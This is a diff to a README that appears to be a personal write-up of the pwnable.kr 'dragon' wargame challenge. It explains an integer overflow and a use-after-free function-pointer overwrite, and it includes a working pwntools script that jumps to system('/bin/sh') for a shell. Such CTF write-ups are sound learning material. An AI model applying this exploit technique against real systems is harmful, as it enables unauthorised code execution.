@@ -76,4 +76,36 @@ in the attack() code, it seems the enemy is free'd when its killed. but then lat
 
 ![1774621694008](images/readme/1774621694008.png)
 
-if we can possibly overflow the heap and store an address there to system() we might be able to jump to the address that pops a shell. i believe this direction is correct cuz theres a really random malloc lol :)
+if we can possibly overflow the heap and store an address there to system() we might be able to jump to the address that pops a shell. i believe this direction is correct cuz theres a really random malloc lol :) I need to calculate how many bytes into the buffer is the pointer to the function that prints info. that way when it scans some memory i can input a address of the shell at the correct spot. also i need to find a way to win the game lol :^)
+
+luckily the scanf is enough memory to store the pointer (%16s)
+
+![1774622451463](images/readme/1774622451463.png)
+
+seems theres no actual possible legal way to beat the game, but i noticed that theres a pretty basic integer overflow that happens and actually makes the dragons health 0. if we lose the first time and fight the mama dragon with hp 80 and regen of 4 health each turn i can continuously use the invincible action (Twice) and then the regen mana and survive long enough for her health to turn to 0 and i win! then i just need to enter the address of the system("/bin/sh"); and we won! ill find the address when the args start getting setup for that and win! theres actually no way for me to do this without a script as i need to enter raw bytes, and its after normal input. so ill write a simple pwntools script to get invinicble and enter an address to jump to
+
+```
+from pwn import *
+
+c = ssh('dragon', 'pwnable.kr', password='guest', port=2222)
+rem = c.process('nc 0 9004'.split())
+
+rem.send(b'1\n1\n1\n1\n3\n3\n2\n3\n3\n2\n3\n3\n2\n3\n3\n2\n') 
+#pick priest, die, pick priest, go invincible, int overflow, dragon dies
+rem.send(p32(0x08048dbf) + b'\n') #exploith eap overflow changethe function pointer to print dragon info
+rem.interactive()   
+```
+
+![1774628958087](images/readme/1774628958087.png)
+
+nice!
+
+basicically as i explained earlier we win using the integer overflow and then the free and then malloc uses the same memory chunk so we can jump anywhere in memory.
+
+&enemy_info = x
+
+enemy_info[0] = function_to_print_info() (its just a address)
+
+then its freed so that memory is on the free list but then we malloc that memory and input into it. when scanf is run it overwrites stuff on enemy_infos memory:
+
+now enemy_info[0] = whatever i just inputted. if i input a different address itll jump to that address instead when calling (void (*)(void) )enemy_info[0] (). if i input raw bytes (using pwntools) itll replace the address of the function towhatever address i enter and itll jump to that
